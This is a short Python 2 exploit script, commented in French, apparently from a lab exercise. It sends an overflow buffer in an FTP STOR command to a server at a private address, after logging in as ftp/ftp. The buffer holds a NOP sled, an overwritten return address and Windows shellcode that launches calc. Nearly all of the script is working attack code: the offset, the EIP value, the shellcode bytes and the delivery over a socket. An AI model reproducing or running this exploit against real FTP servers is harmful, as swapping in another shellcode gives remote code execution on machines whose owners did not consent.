#!/usr/bin/python
# coding:utf-8


from socket import *
import sys, struct, os, time

# Initialisation des variables
host = "10.1.20.133" 
port = 21

# Création de la socket
s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(2000)
time.sleep(2)


# Shellcode calc https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html
sf = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"

#buffer = "\x41" * 968 + "\x42" *4 + "\x43" * 1000 #B->\x42
retour_eip = "\x01\x12\x69\x76"
buffer="\x90" * 968 + retour_eip + "\x90" * 16 +sf

# Envoie des informations vers le serveur ftp
print "[+] length: %d" % (len(buffer))
s.send('USER ftp\r\n')
print s.recv(2000)
s.send('PASS ftp\r\n')
print s.recv(2000)
s.send('STOR '+ buffer + "\r\n")
print s.recv(2000)
print "[+] Evil sent!"
s.close()
